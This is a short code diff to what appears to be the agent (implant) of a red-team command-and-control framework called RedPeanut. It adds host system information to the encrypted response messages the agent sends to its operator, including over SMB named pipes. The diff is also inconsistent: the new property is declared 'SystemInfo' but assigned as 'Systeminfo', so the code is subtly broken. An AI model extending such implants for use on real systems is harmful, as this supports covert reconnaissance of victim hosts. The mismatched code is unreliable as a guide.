@@ -105,6 +105,7 @@ namespace RedPeanutAgent.Core
             ResponseMsg respmsg = new ResponseMsg
             {
                 TaskInstanceid = taskinstance,
+                Systeminfo = GetSystemInfo(),
                 Chunked = false,
                 Agentid = agentid,
                 Number = 1,
@@ -132,6 +133,7 @@ namespace RedPeanutAgent.Core
         public static void SendOutputSMB(string output, byte[] aeskey, byte[] aesiv, NamedPipeClientStream pipe)
         {
             ResponseMsg respmsg = new ResponseMsg();
+            respmsg.Systeminfo = GetSystemInfo();
             respmsg.Chunked = false;
             int chunksize = 1024;
             //Response need to be splitted
@@ -431,6 +433,7 @@ namespace RedPeanutAgent.Core
             public string Agentid { get; set; }
             public string AgentPivot { get; set; }
             public string TaskInstanceid { get; set; }
+            public SystemInfo SystemInfo { get; set; }
             public bool Chunked { get; set; }
             public int Number { get; set; }
             public string Data { get; set; }
